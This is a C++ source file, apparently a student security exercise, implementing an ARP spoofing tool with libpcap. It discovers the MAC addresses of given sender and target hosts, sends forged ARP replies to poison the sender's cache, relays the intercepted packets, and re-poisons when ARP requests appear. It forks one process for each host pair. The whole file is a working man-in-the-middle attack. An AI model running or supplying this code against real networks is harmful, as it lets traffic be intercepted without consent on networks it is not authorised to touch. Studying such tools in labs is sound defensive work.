#include "lihd.h"
#include <sys/wait.h>
#include <netinet/in.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "pch.h"

struct EthArpPacket final
{
	EthHdr eth_;
	ArpHdr arp_;
};

struct net_info {
   unsigned int ipv4;
   uint8_t mac[6];
};

void usage()
{
	printf("syntax: send-arp-test <interface> [<sender IP> <target IP> <sender IP> <target IP> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.1.1 192.168.1.3 192.168.1.2 192.168.1.3\n");
}

void get_net_info(char *iface, uint8_t *mac, unsigned int *ip)
{
	int fd;
	struct ifreq ifr;
	struct sockaddr_in *sin;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
	ioctl(fd, SIOCGIFADDR, &ifr);
	sin = (struct sockaddr_in *)&ifr.ifr_addr;
	*ip = sin->sin_addr.s_addr;
	close(fd);
}

int process_ip_pair(char *inface, char *sender_ip, char *target_ip)
{
	char *iface = inface;
	struct net_info attacker;
	struct net_info sender;
	struct net_info target;
	sender.ipv4 = Ip(sender_ip);
	target.ipv4 = Ip(target_ip);
	get_net_info(inface, attacker.mac, &attacker.ipv4); // mac, ip 받아오기
	// sender에게 arp 요청 보내서 mac 받기 위한 arp 패킷 정의
	EthArpPacket arp_packet_to_sender;
	arp_packet_to_sender.eth_.dmac_ = Mac("FF-FF-FF-FF-FF-FF");
	arp_packet_to_sender.eth_.smac_ = attacker.mac;
	arp_packet_to_sender.eth_.type_ = htons(EthHdr::Arp);
	arp_packet_to_sender.arp_.hrd_ = htons(ArpHdr::ETHER);
	arp_packet_to_sender.arp_.pro_ = htons(EthHdr::Ip4);
	arp_packet_to_sender.arp_.hln_ = Mac::SIZE;
	arp_packet_to_sender.arp_.pln_ = Ip::SIZE;
	arp_packet_to_sender.arp_.op_ = htons(ArpHdr::Request);
	arp_packet_to_sender.arp_.sip_ = attacker.ipv4;
	arp_packet_to_sender.arp_.smac_ = Mac(attacker.mac);
	arp_packet_to_sender.arp_.tmac_ = Mac("00-00-00-00-00-00");
	arp_packet_to_sender.arp_.tip_ = htonl(Ip(sender_ip));

	EthArpPacket arp_packet_to_target;
	arp_packet_to_target.eth_.dmac_ = Mac("FF-FF-FF-FF-FF-FF");
	arp_packet_to_target.eth_.smac_ = attacker.mac;
	arp_packet_to_target.eth_.type_ = htons(EthHdr::Arp);
	arp_packet_to_target.arp_.hrd_ = htons(ArpHdr::ETHER);
	arp_packet_to_target.arp_.pro_ = htons(EthHdr::Ip4);
	arp_packet_to_target.arp_.hln_ = Mac::SIZE;
	arp_packet_to_target.arp_.pln_ = Ip::SIZE;
	arp_packet_to_target.arp_.op_ = htons(ArpHdr::Request);
	arp_packet_to_target.arp_.sip_ = attacker.ipv4;
	arp_packet_to_target.arp_.smac_ = Mac(attacker.mac);
	arp_packet_to_target.arp_.tmac_ = Mac("00-00-00-00-00-00");
	arp_packet_to_target.arp_.tip_ = htonl(Ip(target_ip));

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *packet = pcap_open_live(iface, BUFSIZ, 1, 1, errbuf);

	if (packet == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", iface, errbuf);
		return -1;
	}

	int res = pcap_sendpacket(packet, reinterpret_cast<const u_char *>(&arp_packet_to_sender), sizeof(EthArpPacket));
	if (res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(packet));
	}

	while (true)
	{
		struct pcap_pkthdr *header;
		const u_char *re_packet;
		int res = pcap_next_ex(packet, &header, &re_packet);
		EthArpPacket *reply = (EthArpPacket *)re_packet;
		if (reply->arp_.sip_ == Ip(htonl(Ip(sender_ip))))
		{
			memcpy(sender.mac, &reply->arp_.smac_, sizeof(sender.mac));
			break;
		}
	}

	res = pcap_sendpacket(packet, reinterpret_cast<const u_char *>(&arp_packet_to_target), sizeof(EthArpPacket));
	if (res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(packet));
	}


	while (true)
	{
		struct pcap_pkthdr *header;
		const u_char *re_packet;
		int res = pcap_next_ex(packet, &header, &re_packet);
		EthArpPacket *reply = (EthArpPacket *)re_packet;
		if (reply->arp_.sip_ == Ip(htonl(Ip(target_ip))))
		{
			memcpy(target.mac, &reply->arp_.smac_, sizeof(target.mac));
			break;
		}
	}

	EthArpPacket arp_packet;
	arp_packet.eth_.dmac_ = sender.mac;
	arp_packet.eth_.smac_ = attacker.mac;
	arp_packet.eth_.type_ = htons(EthHdr::Arp);
	arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
	arp_packet.arp_.hln_ = Mac::SIZE;
	arp_packet.arp_.pln_ = Ip::SIZE;
	arp_packet.arp_.op_ = htons(ArpHdr::Reply);
	arp_packet.arp_.sip_ = htonl(target.ipv4);
	arp_packet.arp_.smac_ = attacker.mac;
	arp_packet.arp_.tmac_ = sender.mac;
	arp_packet.arp_.tip_ = htonl(sender.ipv4);
	// 공격 패킷 전송
	int atk = pcap_sendpacket(packet, reinterpret_cast<const u_char *>(&arp_packet), sizeof(EthArpPacket));
	if (atk != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", atk, pcap_geterr(packet));
	}

	while (true)
	{
		struct pcap_pkthdr *header;
		const u_char *re_packet;
		int res = pcap_next_ex(packet, &header, &re_packet);

		u_char *relay_packet = new u_char[header->len];
		memcpy(relay_packet, re_packet, header->len);
		libnet_ethernet_hdr *eth_hdr = (libnet_ethernet_hdr *)re_packet;
		libnet_ipv4_hdr *ipv4_hdr = (libnet_ipv4_hdr *)(re_packet + 14);
	
		if (ipv4_hdr->ip_dst.s_addr == htonl(Ip(target_ip)))
		{
			for (int i = 0; i < 6; i++)
			{
				relay_packet[i] = target.mac[i];
			}

			atk = pcap_sendpacket(packet, relay_packet, header->len);
			if (atk != 0)
			{
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", atk, pcap_geterr(packet));
			}
		}
		if ((ntohs(eth_hdr->ether_type) == 0x0806))
		{
			EthArpPacket *tmp_eth = (EthArpPacket *)(re_packet);
			if (tmp_eth->arp_.tip_ == Ip(htonl(Ip(target_ip))) && (tmp_eth->arp_.op_ == htons(ArpHdr::Request)))
			{
				atk = pcap_sendpacket(packet, reinterpret_cast<const u_char *>(&arp_packet), sizeof(EthArpPacket));
				if (atk != 0)
				{
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", atk, pcap_geterr(packet));
				}
			}
		}
	}

	pcap_close(packet);
}

int main(int argc, char *argv[])
{
	if (argc < 3 || argc % 2 == 1)
	{
		usage();
		return -1;
	}

	char *iface = argv[1];
	for (int i = 2; i < argc; i += 2)
	{
		pid_t pid = fork(); // 자식 프로세스 생성
		if (pid == 0)
		{ // 자식 프로세스 내부
			process_ip_pair(iface, argv[i], argv[i + 1]);
			exit(0); // 자식 프로세스 종료
		}
		else if (pid < 0)
		{
			perror("fork failed");
			return -1;
		}
	}

	for (int i = 2; i < argc; i += 2)
	{
		wait(NULL);
	}

	return 0;
}